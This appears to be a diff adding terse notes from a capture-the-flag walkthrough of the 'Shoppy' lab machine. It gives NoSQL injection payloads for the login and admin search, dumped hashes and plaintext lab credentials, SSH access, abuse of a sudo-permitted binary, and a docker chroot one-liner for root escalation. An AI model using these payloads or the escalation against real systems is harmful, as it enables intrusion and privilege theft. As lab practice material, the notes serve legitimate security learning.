@@ -1,0 +1,34 @@
+Subdomain Found
+================
+mattermost
+
+SQL Injection shoppy.htb/login
+admin' ||  '' == ' -> Get Payload using mongomap.py
+
+Search user in shoppy.htb/admin
+payload ' || '' == ' -> Get username and hash password of admin and josh
+admin:23c6877d9e2b564ef8b32c3a23de27b2:Not Found
+josh:6ebcea65320589ca4f2f1ce039975995:remembermethisway
+
+Login josh:remembermethisway in mattermost.shoppy.htb
+Got creds in Deploy Machine chat
+jaeger:Sh0ppyBest@pp!
+
+Login SSH using creds jaeger
+Got user.txt
+8c6657596f69ec5ca522d88c9234cb77
+
+Privesc
+sudo -l got deploy user can execute /home/deploy/password-manager
+
+cat /home/deploy/password-manager
+Got password Sample
+
+sudo -u deploy /home/deploy/password-manager
+Got creds
+deploy:Deploying@pp!
+
+GTFObins docker privesc
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+Got root
